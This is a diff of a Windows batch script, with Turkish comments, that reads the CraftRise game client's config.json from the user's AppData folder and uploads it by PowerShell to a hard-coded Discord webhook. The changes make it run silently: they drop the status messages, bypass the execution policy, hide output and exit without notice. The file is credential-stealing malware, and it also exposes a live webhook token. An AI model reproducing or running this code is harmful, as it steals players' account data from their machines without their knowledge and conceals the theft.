@@ -1,22 +1,15 @@
 @echo off
-setlocal
+setlocal EnableDelayedExpansion
 
-:: Discord Webhook URL
-set "https://discordapp.com/api/webhooks/1469687998869405951/DURtiUe_9DHXWHy6AUGRN54iHoif5ixmh9kJSu9hdkbrmOqPo1AJ1F0w9zNs2DBrio_U"
-
-:: Config dosyası yolu
+set "WEBHOOK=https://discordapp.com/api/webhooks/1469687998869405951/DURtiUe_9DHXWHy6AUGRN54iHoif5ixmh9kJSu9hdkbrmOqPo1AJ1F0w9zNs2DBrio_U"
 set "CONFIG_FILE=%APPDATA%\.craftrise\config.json"
 
-:: Dosya var mı kontrol
-if not exist "%CONFIG_FILE%" (
-    echo Config dosyasi bulunamadi: %CONFIG_FILE%
-    pause
-    exit /b
-)
+if not exist "%CONFIG_FILE%" exit /b
 
-:: PowerShell ile gönderme (tek satır, düzgün kaçış)
-powershell -NoProfile -Command "$boundary = [guid]::NewGuid().ToString(); $content = Get-Content -Path '%CONFIG_FILE%' -Raw -Encoding UTF8; $body = '--' + $boundary + \"`r`n\" + 'Content-Disposition: form-data; name=\"file\"; filename=\"config.json\"' + \"`r`n\" + 'Content-Type: application/json' + \"`r`n`r`n\" + $content + \"`r`n\" + '--' + $boundary + '--' + \"`r`n\"; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -ContentType \"multipart/form-data; boundary=$boundary\" -Body $body -TimeoutSec 30"
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "$b = [guid]::NewGuid().ToString(); " ^
+    "$c = Get-Content '%CONFIG_FILE%' -Raw -Encoding UTF8; " ^
+    "$body = '--'+$b+'`r`nContent-Disposition: form-data; name=""file""; filename=""config.json""`r`nContent-Type: application/json`r`n`r`n'+$c+'`r`n--'+$b+'--'; " ^
+    "Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -ContentType 'multipart/form-data; boundary='+$b -Body $body -TimeoutSec 30" >nul 2>&1
 
-echo.
-echo Config.json basariyla webhook'a gonderildi!
-pausePK                  
+exit
